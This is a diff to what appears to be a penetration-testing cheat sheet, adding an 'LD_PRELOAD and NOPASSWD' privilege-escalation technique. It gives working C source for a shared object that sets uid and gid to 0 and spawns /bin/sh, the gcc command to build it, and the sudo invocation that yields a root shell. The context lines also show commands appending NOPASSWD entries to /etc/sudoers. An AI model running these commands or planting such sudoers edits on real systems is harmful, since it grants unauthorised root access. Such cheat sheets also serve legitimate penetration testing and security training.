@@ -515,6 +515,25 @@ openssl passwd -1 -salt hack password123
 echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
 echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
 ```
+###### LD_PRELOAD and NOPASSWD
+If LD_PRELOAD is explicitly defined in the sudoers file
+```
+Defaults        env_keep += LD_PRELOAD
+```
+Compile the following shared object using the C code below with gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/sh");
+}
+```
+Execute any binary with the LD_PRELOAD to spawn a shell : sudo LD_PRELOAD=<full_path_to_so_file> <program>, e.g: sudo LD_PRELOAD=/tmp/shell.so find
 ###### Postgresql to RCE
 ```
 To run system commands on Linux or Windows, we need to use the PROGRAM parameter. We start with creating a table; we can name — shell.
